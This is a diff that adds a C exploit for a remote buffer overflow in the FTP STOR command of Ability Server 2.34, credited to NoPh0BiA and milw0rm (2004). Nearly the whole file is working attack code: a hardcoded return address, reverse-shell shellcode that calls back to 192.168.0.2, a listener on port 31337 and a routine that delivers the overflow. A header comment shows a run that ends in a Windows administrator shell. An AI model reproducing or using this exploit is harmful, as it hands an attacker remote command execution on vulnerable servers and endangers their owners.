@@ -1,0 +1,184 @@
+/*
+no@0x00:~/Exploits/abilityftp$ ./ability-exploit
+**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**
+[x] Launching listener.
+[x] Bind successfull.
+[x] Listening on port 31337.
+[x] Connected to: 192.168.0.1.
+[x] Sending bad code...done.
+[x] Waiting for shell.
+[x] Got connection from 192.168.0.1.
+[x] 0wn3d!
+
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) Copyright 1985-2000 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop\abilitywebserver>
+
+ reverse shellcode that connects back to 192.168.0.2 lamers get your own shellcode ;)
+ bad chars 0x00 0x0a 0x0d.
+*/
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <string.h>
+
+#define RET "\xC7\xF2\xC8\x77" /*win2k adv server sp4*/
+#define PORT 21
+#define PORT1 31337
+#define BACKLOG 1
+
+/* www.metasploit.com*/
+char shellcode[] =
+"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5a\x81\x73\x17\x92\x8e"
+"\xe9\x41\x83\xeb\xfc\xe2\xf4\x6e\x66\xbf\x41\x92\x8e\xba\x14\xc4"
+"\xd9\x62\x2d\xb6\x96\x62\x04\xae\x05\xbd\x44\xea\x8f\x03\xca\xd8"
+"\x96\x62\x1b\xb2\x8f\x02\xa2\xa0\xc7\x62\x75\x19\x8f\x07\x70\x6d"
+"\x72\xd8\x81\x3e\xb6\x09\x35\x95\x4f\x26\x4c\x93\x49\x02\xb3\xa9"
+"\xf2\xcd\x55\xe7\x6f\x62\x1b\xb6\x8f\x02\x27\x19\x82\xa2\xca\xc8"
+"\x92\xe8\xaa\x19\x8a\x62\x40\x7a\x65\xeb\x70\x52\xd1\xb7\x1c\xc9"
+"\x4c\xe1\x41\xcc\xe4\xd9\x18\xf6\x05\xf0\xca\xc9\x82\x62\x1a\x8e"
+"\x05\xf2\xca\xc9\x86\xba\x29\x1c\xc0\xe7\xad\x6d\x58\x60\x86\x13"
+"\x62\xe9\x40\x92\x8e\xbe\x17\xc1\x07\x0c\xa9\x8d\x8e\xe9\x41\x02"
+"\x8f\xe9\x41\x24\x97\xf1\xa6\x36\x97\x99\xa8\x7e\x77\x43\x21\x4b"
+"\x87\x1c\xec\x59\x63\x15\x7a\xc5\xdd\xdb\x1e\xa1\xbc\xe9\x1a\x1f"
+"\xc5\xf1\x10\x6d\x59\x60\x9e\x1b\x4d\x64\x34\x86\xe4\xec\x18\xc3"
+"\xdd\x16\x75\x1d\x71\xbc\x45\xcb\x07\xed\xcf\x70\x7c\xc2\x66\xc6"
+"\x71\xde\xbe\xc7\xa6\xd8\x81\xc2\xde\xb9\x11\xd2\xde\xa9\x11\x6d"
+"\xdb\xcd\xc8\x55\xe6\x29\xe9\x92\x8c\x81\x43\x92\xf4\x80\xc8\x73"
+"\xe4\xf9\x10\xc5\x71\xbc\x61\xcb\xd7\x81\x02\xdf\xca\xe9\xc8\x71"
+"\x09\x13\x70\x52\x03\x95\x65\x3e\xe4\xfc\x18\x61\x25\x6e\xbb\x11"
+"\x62\xbd\x87\xd6\xaa\xf9\x05\xf4\x49\xad\x65\xae\x8f\xe8\xc8\xee"
+"\xaa\xa1\xc8\xee\xaa\xa5\xc8\xee\xaa\xb9\xcc\xd6\xaa\xf9\x15\xc2"
+"\xdf\xb8\x10\xd3\xdf\xa0\x10\xc3\xdd\xb8\xbe\xe7\x8e\x81\x33\x6c"
+"\x3d\xff\xbe\xc7\x8a\x16\x91\x1b\x68\x16\x34\x92\xe6\x44\x98\x97"
+"\x40\x16\x14\x96\x07\x2a\x2b\x6d\x71\xdf\xbe\x41\x71\x9c\x41\xfa"
+"\x7e\x63\x45\xcd\x71\xbc\x45\xa3\x55\xba\xbe\x42\x8e\xe9\x41";
+
+struct sockaddr_in hrm,lar,target;
+void shell(int sock)
+{
+ fd_set fd_read;
+ char buff[1024];
+ int n;
+ 
+ while(1) {
+  FD_SET(sock,&fd_read);
+  FD_SET(0,&fd_read);
+ 
+  if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
+ 
+  if( FD_ISSET(sock, &fd_read) ) {
+   n=read(sock,buff,sizeof(buff));
+   if (n == 0) {
+       printf ("Connection closed.\n");
+       exit(EXIT_FAILURE);
+   } else if (n < 0) {
+       perror("read remote");
+       exit(EXIT_FAILURE);
+   }
+   write(1,buff,n);
+  }
+ 
+  if ( FD_ISSET(0, &fd_read) ) {
+    if((n=read(0,buff,sizeof(buff)))<=0){
+      perror ("read user");
+      exit(EXIT_FAILURE);
+    }
+    write(sock,buff,n);
+  }
+ }
+ close(sock);
+}
+
+int conn(char *ip)
+{
+ int sockfd;
+ hrm.sin_family = AF_INET;
+ hrm.sin_port = htons(PORT);
+ hrm.sin_addr.s_addr = inet_addr(ip);
+ bzero(&(hrm.sin_zero),8);
+ sockfd = socket(AF_INET,SOCK_STREAM,0);
+if((connect(sockfd,(struct sockaddr *)&hrm,sizeof(struct sockaddr))) < 0)
+{
+ perror("connect");
+ exit(0);
+}
+ printf("[x] Connected to: %s.\n",ip);
+ return sockfd;
+}
+
+int listener()
+{
+ int sd;
+ lar.sin_family = AF_INET;
+ lar.sin_port = htons(PORT1);
+ lar.sin_addr.s_addr = INADDR_ANY;
+ bzero(&(lar.sin_zero),8);
+ sd = socket(AF_INET,SOCK_STREAM,0);
+if((bind(sd,(struct sockaddr *)&lar,sizeof(struct sockaddr)))<0)
+{
+ perror("bind");
+ exit(0);
+}
+ printf("[x] Bind successfull.\n");
+if((listen(sd,BACKLOG)) < 0)
+{
+ perror("listen");
+ exit(0);
+}
+ printf("[x] Listening on port %d.\n",PORT1);
+ return sd;
+}
+int main(int argc, char *argv[])
+{
+ char *buffer=malloc(1387),*A=malloc(968),*B=malloc(32),*reply=malloc(200);
+ int x,l,news,f;
+ memset(A,0x41,968);
+ strcat(buffer,A);
+ memset(B,0x42,32);
+ strcat(buffer,RET);
+ strcat(buffer,B);
+ strcat(buffer,shellcode);
+ printf("**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**\n");
+ printf("[x] Launching listener.\n");
+ l = listener();
+ x = conn("192.168.0.1");
+ sleep(5);
+ printf("[x] Sending bad code...");
+ write(x,"USER lar\r\nPASS lar\r\n",20);
+ sleep(3);
+ write(x,"STOR ",5);
+ write(x,buffer,strlen(buffer));
+ write(x,"\r\n\r\n",4);
+ sleep(3);
+ printf("done.\n");
+ printf("[x] Waiting for shell.\n");
+ close(x);
+while(1)
+{
+ news = sizeof(struct sockaddr_in);
+if((f=accept(l,(struct sockaddr *)&target,&news)) < 0)
+ {
+  perror("accept");
+  continue;
+ }
+printf("[x] Got connection from %s.\n",inet_ntoa(target.sin_addr));
+ if(!fork()){
+ printf("[x] 0wn3d!\n\n");
+ shell(f);
+ close(f);
+ exit(0);
+}
+ close(f);
+}
+ 
+}
+
+// milw0rm.com [2004-11-07]
